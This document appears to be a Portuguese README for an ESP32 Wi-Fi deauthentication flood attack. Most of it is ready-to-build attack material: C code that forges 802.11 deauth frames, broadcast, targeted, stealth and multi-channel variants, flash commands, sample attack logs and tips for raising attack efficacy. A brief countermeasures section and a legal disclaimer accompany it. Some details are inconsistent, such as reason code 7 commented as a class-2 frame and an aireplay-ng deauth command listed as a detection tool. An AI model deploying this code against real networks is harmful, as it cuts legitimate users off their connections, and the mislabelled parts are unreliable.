# Deauthentication Flood Attack - Implementação Técnica

## Descrição do Ataque

O Deauthentication Flood é um ataque de negação de serviço (DoS) que explora a vulnerabilidade dos frames de deautenticação 802.11. O atacante envia frames de deautenticação forjados para forçar a desconexão de clientes legítimos do Access Point, causando interrupção do serviço.

## Funcionamento Técnico

### 1. Princípio do Ataque
O protocolo 802.11 permite que qualquer dispositivo envie frames de deautenticação sem autenticação prévia, criando uma vulnerabilidade fundamental.

```
Normal: Cliente ↔ AP (conectado)
Ataque: Atacante → Cliente/AP (frame deauth)
Resultado: Cliente desconectado do AP
```

### 2. Estrutura do Frame 802.11 Deauth
```c
typedef struct {
    uint8_t frame_control[2];    // Tipo de frame (0x00, 0xC0)
    uint8_t duration[2];         // Duração
    uint8_t addr1[6];            // MAC destino (cliente)
    uint8_t addr2[6];            // MAC origem (AP falsificado)
    uint8_t addr3[6];            // BSSID do AP
    uint8_t seq_ctrl[2];         // Controle de sequência
    uint8_t reason_code[2];      // Código de razão da desconexão
} __attribute__((packed)) deauth_frame_t;
```

### 3. Implementação no ESP32

#### 3.1 Configuração do Frame
```c
void create_deauth_frame(uint8_t *frame, uint8_t *target_mac, uint8_t *ap_mac) {
    deauth_frame_t *deauth = (deauth_frame_t*)frame;
    
    // Frame Control: Deauthentication
    deauth->frame_control[0] = 0xC0;
    deauth->frame_control[1] = 0x00;
    
    // Endereços MAC
    memcpy(deauth->addr1, target_mac, 6);    // Cliente alvo
    memcpy(deauth->addr2, ap_mac, 6);        // AP (falsificado)
    memcpy(deauth->addr3, ap_mac, 6);        // BSSID
    
    // Código de razão (classe 2 frame received from non-auth STA)
    deauth->reason_code[0] = 0x07;
    deauth->reason_code[1] = 0x00;
}
```

#### 3.2 Envio de Frames Maliciosos
```c
void send_deauth_frame(uint8_t *target_mac) {
    uint8_t deauth_frame[26];
    
    create_deauth_frame(deauth_frame, target_mac, ap_bssid);
    
    // Enviar frame raw 802.11
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
    
    deauth_frames_sent++;
    ESP_LOGW(TAG, "💀 Frame deauth enviado para: " MACSTR, MAC2STR(target_mac));
}
```

#### 3.3 Loop Principal de Ataque
```c
static void deauth_flood_task(void *pvParameters) {
    while (deauth_frames_sent < MAX_DEAUTH_FRAMES && keep_attacking) {
        // Atacar todos os clientes conhecidos
        for (int i = 0; i < connected_clients; i++) {
            send_deauth_frame(client_list[i].mac);
            vTaskDelay(pdMS_TO_TICKS(DEAUTH_INTERVAL_MS));
        }
        
        // Ataque broadcast (todos os clientes)
        uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        send_deauth_frame(broadcast_mac);
        
        // Mostrar estatísticas periodicamente
        if (deauth_frames_sent % 10 == 0) {
            show_deauth_stats();
        }
        
        vTaskDelay(pdMS_TO_TICKS(DEAUTH_INTERVAL_MS));
    }
}
```

## Configurações de Ataque

### 1. Parâmetros Principais
```c
#define TARGET_SSID "ESP32_AP"           // AP alvo
#define TARGET_PASS "12345678"           // Senha do AP
#define DEAUTH_INTERVAL_MS 100           // Intervalo entre frames
#define MAX_DEAUTH_FRAMES 1000           // Máximo de frames
#define BROADCAST_ATTACK true            // Ataque broadcast
#define TARGET_SPECIFIC_CLIENTS true     // Atacar clientes específicos
```

### 2. Códigos de Razão IEEE 802.11
```c
typedef enum {
    REASON_UNSPECIFIED = 1,
    REASON_PREV_AUTH_NOT_VALID = 2,
    REASON_DEAUTH_LEAVING = 3,
    REASON_DISASSOC_DUE_TO_INACTIVITY = 4,
    REASON_CLASS2_FRAME_FROM_NONAUTH_STA = 6,
    REASON_CLASS3_FRAME_FROM_NONASSOC_STA = 7
} deauth_reason_code_t;
```

### 3. Modos de Operação
```c
typedef enum {
    DEAUTH_MODE_BROADCAST,     // Ataque a todos os clientes
    DEAUTH_MODE_TARGETED,      // Ataque a cliente específico
    DEAUTH_MODE_RANDOMIZED,    // Ataques aleatórios
    DEAUTH_MODE_CONTINUOUS     // Ataque contínuo
} deauth_mode_t;
```

## Como Executar

### 1. Pré-requisitos
```bash
# ESP-IDF configurado
. $HOME/esp/esp-idf/export.sh

# Access Point alvo ativo
# Clientes conectados ao AP (para ataque direcionado)
```

### 2. Configuração e Execução
```bash
cd DeauthFlood/

# Configurar parâmetros de ataque
idf.py menuconfig
# → Component config → WiFi → Configurações avançadas

# Compilar e flash
idf.py build
idf.py -p /dev/ttyUSB0 flash
idf.py -p /dev/ttyUSB0 monitor
```

### 3. Sequência de Operação
```
1. ESP32 inicia modo station
2. Escaneia e identifica AP alvo
3. Identifica clientes conectados (opcional)
4. Inicia flood de frames deauth
5. Monitora eficácia do ataque
```

## Análise de Logs

### 1. Início do Ataque
```
I (2000) DEAUTH_FLOOD: 🚨 INICIANDO ATAQUE DEAUTH FLOOD! 🚨
I (2010) DEAUTH_FLOOD: 🎯 Alvo: ESP32_AP
I (2020) DEAUTH_FLOOD: ⚡ Intervalo: 100 ms
I (2030) DEAUTH_FLOOD: 🔢 Máximo de frames: 1000
```

### 2. Descoberta de Alvos
```
I (3000) DEAUTH_FLOOD: 📡 Escaneando AP alvo...
I (4000) DEAUTH_FLOOD: ✅ AP encontrado: ESP32_AP (Canal 6)
I (4010) DEAUTH_FLOOD: 📍 BSSID: aa:bb:cc:dd:ee:ff
I (4020) DEAUTH_FLOOD: 👥 Clientes detectados: 3
```

### 3. Execução do Ataque
```
W (5000) DEAUTH_FLOOD: 💀 Frame deauth #1 enviado!
W (5100) DEAUTH_FLOOD: 💀 Frame deauth #2 enviado!
W (5200) DEAUTH_FLOOD: 🎯 Atacando cliente: 11:22:33:44:55:66
W (5300) DEAUTH_FLOOD: 📡 Ataque broadcast executado
```

### 4. Estatísticas Periódicas
```
I (10000) DEAUTH_FLOOD: 📊 ESTATÍSTICAS DO ATAQUE:
I (10010) DEAUTH_FLOOD: ⚡ Frames enviados: 100
I (10020) DEAUTH_FLOOD: 🎯 Clientes atacados: 3
I (10030) DEAUTH_FLOOD: ⏱️ Tempo de ataque: 10s
I (10040) DEAUTH_FLOOD: 💥 Taxa: 10 frames/seg
```

### 5. Resultado Final
```
W (30000) DEAUTH_FLOOD: ✅ ATAQUE CONCLUÍDO!
W (30010) DEAUTH_FLOOD: 📊 Total de frames: 1000
W (30020) DEAUTH_FLOOD: ⏱️ Duração total: 30 segundos
W (30030) DEAUTH_FLOOD: 🎯 Eficácia estimada: 95%
```

## Detecção e Contramedidas

### 1. Sinais de Ataque Deauth
- Grande volume de frames de deautenticação
- Desconexões simultâneas de múltiplos clientes
- Padrões temporais regulares de desconexão
- Frames com MAC addresses suspeitos ou inconsistentes

### 2. Ferramentas de Detecção
```bash
# Monitoramento de frames 802.11
airodump-ng wlan0mon

# Detecção específica de deauth
aireplay-ng --deauth 0 -a AP_MAC wlan0mon

# IDS wireless
kismet
hostapd com logging detalhado
```

### 3. Contramedidas Eficazes

#### 3.3.1 802.11w (PMF - Protected Management Frames)
```c
// Configuração no AP
wifi_config.ap.pmf_cfg = {
    .capable = true,
    .required = true  // Forçar PMF para todos os clientes
};
```

#### 3.3.2 Rate Limiting
```c
// Limite de frames de deauth por cliente
#define MAX_DEAUTH_PER_CLIENT_PER_SEC 2
#define DEAUTH_RATE_WINDOW_SEC 10
```

#### 3.3.3 Blacklisting Automático
```c
typedef struct {
    uint8_t mac[6];
    uint32_t deauth_count;
    time_t first_deauth;
    bool blocked;
} client_monitor_t;
```

## Variações do Ataque

### 1. Targeted Deauth
Ataque direcionado a cliente específico:
```c
void targeted_deauth_attack(uint8_t *target_mac) {
    for (int i = 0; i < TARGETED_DEAUTH_COUNT; i++) {
        send_deauth_frame(target_mac);
        vTaskDelay(pdMS_TO_TICKS(50));  // Intervalo rápido
    }
}
```

### 2. Stealth Deauth
Ataque com intervalos randomizados:
```c
void stealth_deauth_attack(void) {
    uint32_t random_delay = esp_random() % 1000 + 500;  // 500-1500ms
    vTaskDelay(pdMS_TO_TICKS(random_delay));
    send_deauth_frame(target_mac);
}
```

### 3. Multi-Channel Deauth
Ataque em múltiplos canais:
```c
void multi_channel_deauth(void) {
    uint8_t channels[] = {1, 6, 11};  // Canais principais
    for (int i = 0; i < 3; i++) {
        esp_wifi_set_channel(channels[i], WIFI_SECOND_CHAN_NONE);
        send_deauth_frame(broadcast_mac);
        vTaskDelay(pdMS_TO_TICKS(100));
    }
}
```

## Análise de Impacto

### 1. Métricas de Eficácia
- **Taxa de Desconexão**: 90-98% dos clientes em 10-30 segundos
- **Tempo de Recuperação**: 5-45 segundos dependendo do cliente
- **Overhead de Rede**: +200-500% no tráfego de gerenciamento
- **Detecção**: Facilmente detectável por IDS/IPS modernos

### 2. Impacto nos Clientes
- **Interrupção imediata** de conexões ativas
- **Perda de dados** em transferências ativas
- **Reconexão automática** na maioria dos dispositivos
- **Degradação de QoS** durante reconexão

### 3. Impacto no AP
- **Overhead de processamento** para frames maliciosos
- **Saturação de logs** se logging detalhado estiver ativo
- **Possível instabilidade** em APs com firmware fraco

## Limitações e Considerações

### 1. Limitações Técnicas
- **PMF**: Redes com 802.11w são imunes
- **Rate Limiting**: APs modernos podem limitar frames
- **Detection**: Facilmente detectável por monitoramento
- **Legal**: Ataque ilegal contra redes não autorizadas

### 2. Limitações do ESP32
- **Power**: Limitação de potência de transmissão
- **Range**: Alcance limitado comparado a equipamentos dedicados
- **Processing**: Capacidade limitada para ataques complexos

### 3. Eficácia Variável
- **Modern APs**: Proteções automáticas contra flood
- **Enterprise Networks**: Monitoramento e resposta automática
- **Client Behavior**: Alguns clientes reconectam muito rapidamente

## Uso Responsável

⚠️ **AVISO LEGAL**:
- **Autorização Obrigatória**: Use apenas em redes próprias
- **Fins Educacionais**: Para aprendizado e pesquisa
- **Pentest Autorizado**: Com contrato e escopo definido
- **Compliance**: Respeitar leis locais de telecomunicações

### Cenários Legítimos:
1. **Red Team Assessment**: Testes de penetração autorizados
2. **Vulnerability Research**: Pesquisa acadêmica
3. **Security Training**: Demonstrações educacionais
4. **Product Testing**: Validação de contramedidas

## Troubleshooting

### Problemas Comuns
1. **Frames não enviados**: Verificar modo monitor/promiscuous
2. **AP não afetado**: Verificar se PMF está ativo
3. **Baixa eficácia**: Aumentar taxa de frames ou reduzir intervalo
4. **Erro de compilação**: Verificar configurações de WiFi no menuconfig

### Debug Avançado
```bash
# Monitor detalhado
idf.py monitor --print_filter "*:V"

# Análise de performance
idf.py monitor | grep "deauth\|DEAUTH"

# Captura de tráfego
tcpdump -i wlan0 -e -s 0 type mgt subtype deauth
```
